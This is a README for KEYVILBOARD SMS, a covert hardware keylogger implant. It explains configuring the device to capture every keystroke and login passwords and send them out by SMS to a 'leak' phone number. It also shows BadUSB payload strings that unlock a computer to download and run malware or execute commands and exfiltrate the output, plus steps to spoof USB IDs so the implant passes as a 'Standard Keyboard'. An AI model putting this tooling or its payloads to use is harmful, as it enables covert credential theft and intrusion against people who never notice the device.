# KEYVILBOARD SMS Setup and functions
https://www.youtube.com/watch?v=Oifod3W4mA8

**Only connect the keyboard after the KEYVILBOARD has been inserted into the USB port for a few seconds. Otherwise the keyboard and KEYVILBOARD WILL NOT work. This is due to a capacitor on the board that was added for stability.**

**Also do NOT let the antenna directly touch the SIM tray when putting it in your case! This WILL short your KEYVILBOARD! Although this does no permanent damage, it does disable the KEYVILBOARD to function.**

The majority of this readme was created by [Yago Hansen](https://github.com/yadox666), full credits and thanks go to him for his contributions.   
     
## Specifications
The KEYVILBOARD SMS module is thé hardware keylogger for long during operations, once set into place it will send all keystrokes using SMS via your mobile network provider of choice.

**Key features:**
 - Unlimited action radius via mobile networks (2G only!)
 - Unlimited amount of characters
 - Support for all QWERTY keyboards
 - Support for remote key injection
 - Open-source software
 - Note: SIM card is not included. Is shipped with a clean undercover black case.

## Functionality
1. Red SIM800L LED functionality:
	 - blinking every second - No Cell connection, or SIM not detected
	 - blinking every 3 seconds - Online 

2. Original firmware adds only US compatible keyboard layout. (The fork of [Yago](https://github.com/yadox666/KEYVILBOARD) is working on adding multi-language feature - it is not added to this main repo yet due to it still being in testing)
	It sends keys by time (interval) or SMS buffer full (140 chars.)

3. Smart keylogger features to capture login password.
	Modus operandi:  Insert keylogger device if user session is locked. You can configure it (LOCKPC in globals.h) to automatically lock user session. After inserting it the keylogger waits for user login to capture the password, recognizing it and sending it automatically by SMS.

4. Badusb feature with pre-installed, user defined, or SMS sent payloads.
   - This feature is independant and doesn't need a keyboard connected to the keylogger.
   - It includes a autorun payload option (AUTORUN in globals.h).
   
```
UnlockDownload##os##password##url    // Unlock the computer to download and execute malware
		[os: lnx, win, osx, winlnx, multi]
			Ex: UnlockDownload##lnx##password##url
		
UnlockRunAndExfil##os##password##command  // Unlock the computer to download and execute malware
		Ex: UnlockRunAndExfil##lnx##password##whoami
		
Manual##Action##Argument
		[Action=press,print,delay,release]
			Example: +CMT: Manuall##press##83 72 (in hex)
```

			
5. Automatic keyboard language layout gathering. This is a full new feature developped by [Yago Hansen](https://github.com/yadox666) and is under testing now - check it out [here](https://github.com/yadox666/KEYVILBOARD).

6. Serial port exfiltration feature: 
	- Every data or command output sent to the populated serial port on the destination system (/dev/tty... in Linux or COM port on Windows) will be sent to the running code and later to the SMS configured.

## Configuration
1. SIM Setup

* SIM Lock remove

     Make sure your remove the simlock from the simcard you intent to use in Module. Insert it in a phone/smartphone. Go to security menu and remove PIN inserting the actual one first.
  
* SIM Advice
  
     I reccomend you to take a unlimited texting subscription these will cost about 7-8 euro's a month monthly cancelable keep in mind these are trackable so dont be doing anything illigal with our modules.

* SIM Orientation

	![Look at the SIM corner](https://github.com/yadox666/KEYVILBOARD/blob/master/SMS%20version/extras/IMG_20190716_192137.jpg)
  

2. KEYVILBOARD Setup

* Arduino IDE
     
     The included code works with the arduino Leonardo bootloader. Make sure you download the Arduino IDE and you have a simple understand of how it works.
      
    Do not forget that flashing the firmware using Arduino IDE or the necessary binary needs to be ran on root user or adding your actual user to the dialup group in Linux. I do not use Windows, so DO NOT ASK about IT!


1. It's necessary to modify buffer size in Android library:

```
find . -name SoftwareSerial.h

 $ nano /opt/arduino-1.8.3/hardware/arduino/avr/libraries/SoftwareSerial/src/SoftwareSerial.h

/* NOTE: Make sure to edit SoftwareSerial.h to change
   #define _SS_MAX_RX_BUFF 64 // RX buffer size
   to
   #define _SS_MAX_RX_BUFF 256 // RX buffer size
   You need to set your info in globals.h
*/
```

2. Create your own configuration parameters editing globals.h

```
#pragma once

#include "C_USBhost.h"
#include <SoftwareSerial.h>

/*******************************************/
/******* START CONFIGURATION OPTIONS *******/
/*******************************************/
#define LEAK_PHONE_NUMBER "+XXXXXXXXXXX"		// Set to the leaking phone number
#define IMPLANT_NAME "Implant 1"				// Identify device when multiple used			
//#define DEBUG 								// Un-comment if you want to build with DEBUG.

// Used to debug the code with an arduino without a SIM module and without an USB host
//#define DEBUGWITHOUTSIM true
//#define DEBUGWITHOUTSIM_PAYLOAD "UnlockDownload##win##PASSWORD##https://s3.amazonaws.com/testing/hello.exe"
//#define DEBUGWITHOUTSIM_PAYLOAD "UnlockDownload##osx##PASSWORD##https://s3.amazonaws.com/testing/hello_osx"
//#define DEBUGWITHOUTSIM_PAYLOAD "UnlockDownload##lnx##PASSWORD##https://s3.amazonaws.com/testing/hello_lin"
//#define DEBUGWITHOUTSIM_PAYLOAD "UnlockRunAndExfil##win##PASSWORD##mkdir %TEMP%\\malware"
//#define DEBUGWITHOUTSIM_PAYLOAD "UnlockRunAndExfil##osx##PASSWORD##uname -a"
//#define DEBUGWITHOUTSIM_PAYLOAD "UnlockRunAndExfil##lnx##PASSWORD##touch /tmp/malware"

/*******************************************/
/******* END CONFIGURATION OPTIONS *********/
/*******************************************/


extern C_USBhost USBhost;
extern SoftwareSerial SMSSERIAL;
extern String os;

#define SEPARATOR "##"

#define SMS_CHAR_LIMIT 140
#define MAX_BUFFER_SIZE 1024
#define BAUD_RATE_SIM800L 57600                    
#define BAUD_RATE_USB_HOST_BOARD 115200             
#define BAUD_RATE_SERIAL 115200

#ifdef DEBUG
// Time in minutes we will send a beacon to let know the implant is alive
#define BEACON_TIME 1 
#else
#define BEACON_TIME 30
#endif                      
```

3. Optionally you can modify the device USB VID & PID to keep stealth. This hack will spoof the original device VID & PID (arduino leonardo) to spoof them with a fake one.
 - Select any manufacturer and device usb.ids [https://github.com/yadox666/KEYVILBOARD/blob/master/SMS%20version/extras/usb.ids][VID/PID list]. Write down your favourite VID & PID.
	
4. Modifying arduino device library (comment and copy the original VID/PID lines)
	For example, I will spoof VID 2341/PID 8036 (Arduino Leonardo) by VID 03f9/PID 0102 (Standard Keyboard)
    
```
nano /opt/arduino-1.8.3/hardware/arduino/avr/boards.txt
		#leonardo.vid.3=0x2A03
		#leonardo.pid.3=0x8036
		leonardo.vid.3=0x03f9
		leonardo.pid.3=0x0102

		#leonardo.build.vid=0x2341
		#leonardo.build.pid=0x8036
		#leonardo.build.usb_product="Arduino Leonardo"
		leonardo.build.board=AVR_LEONARDO
		leonardo.build.core=arduino
		leonardo.build.variant=leonardo
		leonardo.build.vid=0x03f9
		leonardo.build.pid=0x0102
		leonardo.build.usb_product="Standard Keyboard"
		#leonardo.build.board=AVR_MICRO
		#leonardo.build.core=micro
		#leonardo.build.variant=keyb
```

5. Revise file: payloads.cpp and replace VID_2341^&PID_8036 for VID_03f9^&PID_0102

6. Revise file: payloads.ccp and change *arduino* for *HIDPCD*

7. Exit Arduino IDE and re-enter. Verify and compile the project.

8. Flash the project again to the device.

9. Extract it and insert it again. Run:

```
$ dmesg

[12088.322618] usb 1-1: new full-speed USB device number 50 using xhci_hcd
[12088.467138] usb 1-1: New USB device found, idVendor=03f9, idProduct=0102
[12088.467149] usb 1-1: New USB device strings: Mfr=1, Product=2, SerialNumber=3
[12088.467156] usb 1-1: Product: Standard Keyboard
[12088.467162] usb 1-1: Manufacturer: Unknown
[12088.467167] usb 1-1: SerialNumber: HIDPCD
[12088.468629] cdc_acm 1-1:1.0: ttyACM0: USB ACM device
[12088.471630] input: Unknown Standard Keyboard as /devices/pci0000:00/0000:00:14.0/usb1/1-1/1-1:1.2/0003:03F9:0102.001B/input/input42
[12088.531047] hid-generic 0003:03F9:0102.001B: input,hidraw0: USB HID v1.01 Keyboard [Unknown Standard Keyboard] on usb-0000:00:14.0-1/input2
```


## Flashing via Linux(verify, compile and upload)
It's important to kill ModemManager daemon in order to be able to flash the device.

```# killall ModemManager

Sketch uses 21834 bytes (76%) of program storage space. Maximum is 28672 bytes.
Global variables use 955 bytes (37%) of dynamic memory, leaving 1605 bytes for local variables. Maximum is 2560 bytes.
Forcing reset using 1200bps open/close on port /dev/ttyACM0
PORTS {/dev/ttyACM0, /dev/ttyUSB0, /dev/ttyUSB1, /dev/ttyUSB2, } / {/dev/ttyUSB0, /dev/ttyUSB1, /dev/ttyUSB2, } => {}
PORTS {/dev/ttyUSB0, /dev/ttyUSB1, /dev/ttyUSB2, } / {/dev/ttyUSB0, /dev/ttyUSB1, /dev/ttyUSB2, } => {}
PORTS {/dev/ttyUSB0, /dev/ttyUSB1, /dev/ttyUSB2, } / {/dev/ttyACM0, /dev/ttyUSB0, /dev/ttyUSB1, /dev/ttyUSB2, } => {/dev/ttyACM0, }
Found upload port: /dev/ttyACM0
/opt/arduino-1.8.3/hardware/tools/avr/bin/avrdude -C/opt/arduino-1.8.3/hardware/tools/avr/etc/avrdude.conf -v -patmega32u4 -cavr109 -P/dev/ttyACM0 -b57600 -D -Uflash:w:/tmp/arduino_build_515764/KEYVILBOARD.ino.hex:i 

avrdude: Version 6.3, compiled on Jan 17 2017 at 11:00:16
         Copyright (c) 2000-2005 Brian Dean, http://www.bdmicro.com/
         Copyright (c) 2007-2014 Joerg Wunsch

         System wide configuration file is "/opt/arduino-1.8.3/hardware/tools/avr/etc/avrdude.conf"
         User configuration file is "/root/.avrduderc"
         User configuration file does not exist or is not a regular file, skipping

         Using Port                    : /dev/ttyACM0
         Using Programmer              : avr109
         Overriding Baud Rate          : 57600
         AVR Part                      : ATmega32U4
         Chip Erase delay              : 9000 us
         PAGEL                         : PD7
         BS2                           : PA0
         RESET disposition             : dedicated
         RETRY pulse                   : SCK
         serial program mode           : yes
         parallel program mode         : yes
         Timeout                       : 200
         StabDelay                     : 100
         CmdexeDelay                   : 25
         SyncLoops                     : 32
         ByteDelay                     : 0
         PollIndex                     : 3
         PollValue                     : 0x53
         Memory Detail                 :

                                  Block Poll               Page                       Polled
           Memory Type Mode Delay Size  Indx Paged  Size   Size #Pages MinW  MaxW   ReadBack
           ----------- ---- ----- ----- ---- ------ ------ ---- ------ ----- ----- ---------
           eeprom        65    20     4    0 no       1024    4      0  9000  9000 0x00 0x00
           flash         65     6   128    0 yes     32768  128    256  4500  4500 0x00 0x00
           lfuse          0     0     0    0 no          1    0      0  9000  9000 0x00 0x00
           hfuse          0     0     0    0 no          1    0      0  9000  9000 0x00 0x00
           efuse          0     0     0    0 no          1    0      0  9000  9000 0x00 0x00
           lock           0     0     0    0 no          1    0      0  9000  9000 0x00 0x00
           calibration    0     0     0    0 no          1    0      0     0     0 0x00 0x00
           signature      0     0     0    0 no          3    0      0     0     0 0x00 0x00

         Programmer Type : butterfly
         Description     : Atmel AppNote AVR109 Boot Loader

Connecting to programmer: .
Found programmer: Id = "CATERIN"; type = S
    Software Version = 1.0; No Hardware Version given.
Programmer supports auto addr increment.
Programmer supports buffered memory access with buffersize=128 bytes.

Programmer supports the following devices:
    Device code: 0x44

avrdude: devcode selected: 0x44
avrdude: AVR device initialized and ready to accept instructions

Reading | ################################################## | 100% 0.00s

avrdude: Device signature = 0x1e9587 (probably m32u4)
avrdude: reading input file "/tmp/arduino_build_515764/KEYVILBOARD.ino.hex"
avrdude: writing flash (21834 bytes):

Writing | ################################################## | 100% 1.65s

avrdude: 21834 bytes of flash written
avrdude: verifying flash memory against /tmp/arduino_build_515764/KEYVILBOARD.ino.hex:
avrdude: load data flash data from input file /tmp/arduino_build_515764/KEYVILBOARD.ino.hex:
avrdude: input file /tmp/arduino_build_515764/KEYVILBOARD.ino.hex contains 21834 bytes
avrdude: reading on-chip flash data:

Reading | ################################################## | 100% 0.17s

avrdude: verifying ...
avrdude: 21834 bytes of flash verified

avrdude done.  Thank you.
```


## Other notes:
  
The keylogging will be at all times persistence the subject will never notice anything different since that the modules are using a raw HID constant throughput no delay no change. We have even tested them while gaming and noticed no difference. Thanks to [michalmonday](https://github.com/michalmonday) for making this possible with his library.
     
We are using 32kb atmega32u4 chips with the current code their is about 9kb left for payloads you can remove certaint functions to get about 16kb.
